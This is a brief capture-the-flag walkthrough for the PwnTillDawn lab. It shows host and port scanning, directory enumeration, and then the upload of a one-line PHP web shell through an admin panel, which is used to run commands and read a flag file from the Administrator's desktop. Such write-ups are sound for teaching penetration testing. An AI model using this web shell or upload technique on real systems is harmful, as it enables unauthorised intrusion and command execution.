Walkthrough (PwnTillDawn – Flag 1)

Step 1: Network Scanning

Since PwnTillDawn already gave the network range:
10.150.150.10 - 10.150.150.254

I scanned for live hosts:
nmap -sn 10.150.150.10-254

Found active target:
10.150.150.11

Step 2: Service & Port Scanning

Then I scanned the target in detail:
nmap -sC -sV -Pn 10.150.150.11

Step 3: Directory Enumeration

Used gobuster to find hidden directories:
gobuster dir -u http://10.150.150.11/ -w /usr/share/wordlists/dirb/common.txt

Found important paths:
/admin
/upload

Step 4: Access Admin Panel

Opened in browser:
http://10.150.150.11/admin

I found file upload functionality

Step 5: Exploitation (Upload Web Shell)

Created a web shell:
echo '<?php system($_GET["cmd"]); ?>'> cmd.php

Uploaded cmd.php via the admin panel.

Step 6: Gain Remote Access

Accessed the web shell in browser:
http://10.150.150.11/upload/2/cmd.php?cmd=whoami

Confirmed access (command executed successfully)

Step 7: Enumeration (Find the Flag)

Navigated directories:
?cmd=dir C:\Users\Administrator\Desktop

Found:
FLAG1.txt

Step 8: Retrieve the Flag

Used:
?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt

Successfully retrieved the flag
